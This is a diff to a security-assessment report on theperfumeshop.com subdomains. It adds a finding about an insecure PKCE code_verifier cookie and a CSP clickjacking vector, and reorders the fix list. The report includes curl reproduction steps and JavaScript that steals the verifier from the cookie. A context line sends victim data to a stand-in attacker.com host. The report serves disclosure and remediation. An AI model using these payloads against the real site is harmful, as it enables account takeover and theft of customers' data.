@@ -570,6 +570,95 @@ Backend also reveals in JavaScript:
 
 ---
 
+## Finding #14: Insecure OAuth PKCE Code Verifier Cookie — Missing HttpOnly/Secure Flags with 400-Day Lifetime
+**Severity**: High (OAuth Security Bypass / Token Theft)
+**Domain**: techsale.theperfumeshop.com
+
+### Description
+The techsale internal application's OAuth flow stores the PKCE code_verifier in a cookie that is missing critical security attributes. The cookie lacks both `HttpOnly` and `Secure` flags, and has an excessive lifetime of 400 days. The PKCE code_verifier is a security-critical OAuth 2.0 parameter — if an attacker obtains it alongside the authorization code, they can exchange it for full access tokens, achieving account takeover.
+
+### Steps to Reproduce
+1. Initiate the OAuth flow:
+   ```bash
+   $ curl -D- -X POST "https://techsale.theperfumeshop.com/api/auth/oauth" \
+     -H "Content-Type: application/json" \
+     -d '{"scope":"COLLEAGUE"}'
+   ```
+2. Observe the `Set-Cookie` header for the code_verifier:
+   ```
+   Set-Cookie: colleague-sb-xrcihilprzuextoudevs-auth-token-code-verifier=base64-IjQxNWVm...
+   Path=/; Expires=Tue, 16 Nov 2027 23:40:30 GMT; Max-Age=34560000; SameSite=lax
+   ```
+3. Note the security issues:
+   - **No `HttpOnly` flag** — accessible via `document.cookie` in JavaScript
+   - **No `Secure` flag** — can be transmitted over HTTP (mitigated by HSTS)
+   - **Max-Age=34560000** (400 days) — code_verifier persists far beyond the OAuth flow
+   - **Path=/** — accessible from any path on the domain
+4. The code_verifier value is a base64-encoded hex string, easily decodable:
+   ```bash
+   $ echo "IjQxNWVm..." | base64 -d
+   "415ef443795349c4418c3bcf53520bd2cfbdc895959e3a40710f572c0832467f..."
+   ```
+5. The same vulnerability exists for all scope levels:
+   ```
+   COLLEAGUE → colleague-sb-*-code-verifier (no HttpOnly, no Secure)
+   ADMIN     → admin-sb-*-code-verifier     (no HttpOnly, no Secure)
+   ```
+
+### Evidence
+```
+# COLLEAGUE scope cookie:
+Set-Cookie: colleague-sb-xrcihilprzuextoudevs-auth-token-code-verifier=base64-IjQxNWVm...
+  Path=/; Expires=Tue, 16 Nov 2027 23:40:30 GMT; Max-Age=34560000; SameSite=lax
+  ❌ Missing: HttpOnly
+  ❌ Missing: Secure
+  ❌ Max-Age: 400 days (should be ~5 minutes)
+
+# ADMIN scope cookie:
+Set-Cookie: admin-sb-xrcihilprzuextoudevs-auth-token-code-verifier=base64-IjlkYmIz...
+  Path=/; Expires=Tue, 16 Nov 2027 23:41:00 GMT; Max-Age=34560000; SameSite=lax
+  ❌ Missing: HttpOnly
+  ❌ Missing: Secure
+  ❌ Max-Age: 400 days (should be ~5 minutes)
+
+# Contrast with Azure session cookies (properly secured):
+Set-Cookie: ARRAffinity=...; Path=/; HttpOnly; Secure; Domain=techsale.theperfumeshop.com
+  ✅ HttpOnly ✅ Secure
+```
+
+### Attack Scenario
+Any XSS vulnerability on `techsale.theperfumeshop.com` (including via compromised dependencies) enables:
+```javascript
+// 1. Read the PKCE code_verifier from cookies (not HttpOnly!)
+const verifier = document.cookie
+  .split(';')
+  .find(c => c.includes('code-verifier'))
+  .split('=')[1];
+
+// 2. Decode the base64-encoded verifier
+const decoded = atob(verifier.replace('base64-', ''));
+
+// 3. Use the verifier to exchange any intercepted auth code for tokens
+// The code_verifier persists for 400 days, providing a long attack window
+```
+
+### Impact
+- **High**: Any XSS on techsale enables reading the PKCE code_verifier, bypassing the PKCE protection designed to prevent authorization code interception
+- **High**: The 400-day cookie lifetime provides an extended attack window — stale code verifiers accumulate in the browser
+- **Medium**: Cookie name leaks the Supabase project identifier and authentication scope level
+- **Medium**: Missing `Secure` flag violates OAuth 2.0 Security Best Current Practice (RFC 9700)
+
+### CVSS 4.0
+**7.1** (High) - CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N
+
+### Recommendation
+1. **Immediate**: Add `HttpOnly` and `Secure` flags to the code_verifier cookie
+2. **Immediate**: Reduce cookie Max-Age to 300 seconds (5 minutes) — the OAuth flow should complete within seconds
+3. **Short-term**: Consider using server-side session storage for the code_verifier instead of a client-side cookie
+4. **Short-term**: Sanitize cookie names to not include the Supabase project identifier or scope level
+
+---
+
 ## Finding #12: Subdomain Takeover via Dangling CloudFront CNAME — CORS Chain to Critical
 **Severity**: Critical (Subdomain Takeover + Credential Theft Chain)
 **Domain**: refer.theperfumeshop.com
@@ -617,6 +706,9 @@ The subdomain `refer.theperfumeshop.com` has a DNS CNAME record pointing to `d21
      new Image().src = 'https://attacker.com/log?' + btoa(JSON.stringify(data));
    });
 ```
+
+**Additional vector — Clickjacking via CSP frame-ancestors wildcard:**
+The main site's CSP header is `frame-ancestors 'self' *.theperfumeshop.com`, which allows any subdomain to iframe the main e-commerce site. After takeover, the attacker can embed `www.theperfumeshop.com` in a transparent iframe on `refer.theperfumeshop.com` and perform UI redressing attacks (tricking users into clicking actions on the real site).
 
 ### Impact
 - **Critical**: Full credential theft chain — attacker reads victim's authenticated API data (PII, orders, saved payment methods, addresses) from the main e-commerce platform
@@ -768,14 +860,16 @@ $ curl -X POST "..." -d "...&username=nonexistent@tps.com&password=test"
 3. **CRITICAL**: Disable GitHub, Google, and Twitter authentication providers on scentral.theperfumeshop.com via `staticwebapp.config.json` route blocks (Finding #7)
 4. **CRITICAL**: Restrict Azure AD authentication on scentral from `/common/` (multi-tenant) to the organization's specific tenant ID (Finding #7)
 5. **HIGH**: Disable Device Code Flow and ROPC grant on the techsale Azure AD app registration (Finding #13)
-6. **HIGH**: Implement server-side authorization scope validation on techsale OAuth flow; do not pass scope as client-controlled parameter (Finding #8)
-7. **HIGH**: Decommission or secure abandoned subdomains and audit ALL DNS records for dangling CNAMEs (Findings #10, #12)
-8. **Immediate**: Fix the internal origin leak on connect by setting `NEXTAUTH_URL` to the public-facing URL (Finding #1)
-9. **Immediate**: Remove SAP Commerce Cloud backend hostname from client-side JavaScript (Finding #11)
-10. **Short-term**: Harden campaigns.theperfumeshop.com - disable directory listing, remove default Apache test page, or decommission (Finding #10 chain)
-11. **Short-term**: Strip Supabase project identifiers from cookie names and CSP headers (Finding #2, #9)
-12. **Short-term**: Remove stale Lync/SfB DNS records (Finding #4)
-13. **Short-term**: Enforce Conditional Access policies requiring MFA for all authentication flows including ROPC and device code (Finding #13)
-14. **Medium-term**: Review Supabase RLS policies for the techsale application
-15. **Medium-term**: Configure SAP Commerce Cloud backend to reject requests not from Akamai CDN
-16. **Medium-term**: Implement DNS record lifecycle management — auto-remove CNAMEs when cloud resources are deprovisioned
+6. **HIGH**: Add HttpOnly and Secure flags to PKCE code_verifier cookies and reduce Max-Age to 300 seconds (Finding #14)
+7. **HIGH**: Implement server-side authorization scope validation on techsale OAuth flow; do not pass scope as client-controlled parameter (Finding #8)
+8. **HIGH**: Decommission or secure abandoned subdomains and audit ALL DNS records for dangling CNAMEs (Findings #10, #12)
+9. **Immediate**: Fix the internal origin leak on connect by setting `NEXTAUTH_URL` to the public-facing URL (Finding #1)
+10. **Immediate**: Remove SAP Commerce Cloud backend hostname from client-side JavaScript (Finding #11)
+11. **Short-term**: Restrict CSP `frame-ancestors` to explicit origins instead of `*.theperfumeshop.com` wildcard to prevent clickjacking via subdomain takeover
+12. **Short-term**: Harden campaigns.theperfumeshop.com - disable directory listing, remove default Apache test page, or decommission (Finding #10 chain)
+13. **Short-term**: Strip Supabase project identifiers from cookie names and CSP headers (Finding #2, #9)
+14. **Short-term**: Remove stale Lync/SfB DNS records (Finding #4)
+15. **Short-term**: Enforce Conditional Access policies requiring MFA for all authentication flows including ROPC and device code (Finding #13)
+16. **Medium-term**: Review Supabase RLS policies for the techsale application
+17. **Medium-term**: Configure SAP Commerce Cloud backend to reject requests not from Akamai CDN
+18. **Medium-term**: Implement DNS record lifecycle management — auto-remove CNAMEs when cloud resources are deprovisioned
